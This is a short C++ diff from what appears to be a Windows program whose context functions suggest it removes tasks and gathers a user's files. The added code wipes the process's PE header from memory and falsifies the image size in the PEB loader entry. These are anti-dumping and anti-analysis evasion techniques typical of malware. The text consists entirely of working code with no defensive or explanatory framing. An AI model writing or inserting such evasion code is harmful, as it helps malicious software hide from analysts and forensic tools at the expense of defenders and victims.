@@ -71,6 +71,21 @@ DWORD removeTasks(LPVOID params_useless) {
 	}
 }
 
+void peHeaderDeleter() {
+    DWORD oldProtect = 0;
+    char* pBaseAddr = (char*)GetModuleHandle(NULL);
+    VirtualProtect(pBaseAddr, 4096, PAGE_READWRITE, &oldProtect);
+    SecureZeroMemory(pBaseAddr, 4096);
+}
+
+void imageSizeIncreaser() {
+    PPEB pPeb = (PPEB)__readgsqword(0x60);
+    PLIST_ENTRY inLoadOrderModuleList = (PLIST_ENTRY)pPeb->Ldr->Reserved2[1];
+    PLDR_DATA_TABLE_ENTRY tableEntry = CONTAINING_RECORD(inLoadOrderModuleList, LDR_DATA_TABLE_ENTRY, Reserved1[0]);
+    PULONG pEntrySizeOfImage = (PULONG)&tableEntry->Reserved3[1];
+    *pEntrySizeOfImage = (ULONG)((INT_PTR)tableEntry->DllBase + 0x100000);
+}
+
 void getAllFiles(string username) {
     vector<string> tmpFiles;
 
